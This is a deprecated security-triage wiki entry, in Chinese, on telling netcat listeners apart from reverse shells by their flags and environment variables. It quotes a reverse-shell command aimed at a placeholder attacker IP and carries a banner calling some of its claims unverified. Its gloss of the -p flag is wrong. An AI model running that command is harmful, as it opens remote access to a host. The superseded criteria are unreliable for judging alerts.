---
id: SC-06b
title: netcat 的两种形态：监听器 vs 外连器
applies_to: [suspicious-command]
refs: []
status: deprecated
deprecated_reason: 原始出处与 SOP 重新核查后，由 SC-15 统一判定
superseded_by: SC-15
updated: 2026-11-03
source: 从 docs/knowledge/suspicious-command.md 迁移
used: 0              # 被 Agent 引用次数（tools/wiki_stats.py 自动统计）
failed: 0            # 判错过几次（人工标，>0 必须写清为什么）
evidence: [_evidence/demo-real-data.md]
---

> **历史判据：已退出自动研判。** 当前判断请读 [SC-15](SC-15.md)；以下保留原文供追溯，部分断言未经原文证实。

# SC-06b · netcat 的两种形态：监听器 vs 外连器

demo 里 `内置规则_使用黑客工具 nc` 一共 **2987 条**，形态分成两堆：

| 形态 | 数量 | path | 特征 |
| --- | --- | --- | --- |
| `nc -lvvkp <端口>` | 绝大多数 | `/usr/bin/ncat` | 纯监听，**不执行 shell** |
| `nc -lp 4444` | 极少数 | `/usr/bin/nc.openbsd` | 交互终端里手敲的 |

## 「-lvvkp」是什么意思

- `-l` 监听
- `-v` 打印详情
- `-v` 再打印一遍
- `-k` keep-open，**接受完一个连接继续监听**
- `-p` 不解析协议，直接监听端口

**关键：没有 `-e` 也没有 `-c`。** 拿到连接之后**不会执行 shell**。

对照攻击者真正用的反弹 shell：
`nc -e /bin/bash <attacker_ip> <port>` —— **必须带 `-e`**。

**所以 `nc -lvvkp 4326` 是端口监听/连通性测试，不是反弹 shell。**

## 怎么用 env 认出它不是人敲的

demo 的真实 env：

```text
_ = /usr/bin/nohup
PWD = /home
SHLVL = 0
CATALINA_HOME=...  TOMCAT_VERSION=...
```

**三个信号叠在一起才是结论**：

1. **`_` 指向 nohup** —— `_` 是 shell 记录的「上一个命令」。它指向 nohup
   说明**这条命令是被 nohup 拉起来的，不是人在终端敲的**
2. **`SHLVL = 0`** —— 没有 shell 层级，进程直接启动
3. **env 里带着应用运行时**（Tomcat / Java / 容器镜像的变量）—— 这是**某个服务的工作进程**

## 反过来，人手敲的 nc 长什么样

```text
PROMPT_COMMAND=history -a
SSH_TTY=/dev/pts/1
_ = /usr/bin/nc
SHLVL = 1
```

**`PROMPT_COMMAND` + `SSH_TTY` + `SHLVL=1`** = **人在交互终端里敲的**。

## 判据

| 问的问题 | 答案 | 结论倾向 |
| --- | --- | --- |
| 有没有 `-e` / `-c`？ | 没有 | **不是反弹 shell** |
| `_` 指向什么？ | nohup / 服务程序 | **自动化** |
| `SHLVL` 是几？ | 0 | **自动化** |
| `PROMPT_COMMAND` 在不在？ | 在 | **人在敲** |
| env 里有没有应用运行时变量？ | 有（Tomcat 等） | **服务的工作进程** |

**⚠️ 但「不是反弹 shell」不等于「误报」。**
自动化监听本身可能是：

- **健康检查**（最常见）—— 端口逐个递增、间隔规律
- **端口扫描** —— 同样是端口递增，但要看到**主动连接**才算

**只监听、只递增端口、不连接任何人 → 更像健康检查 → 误报。**
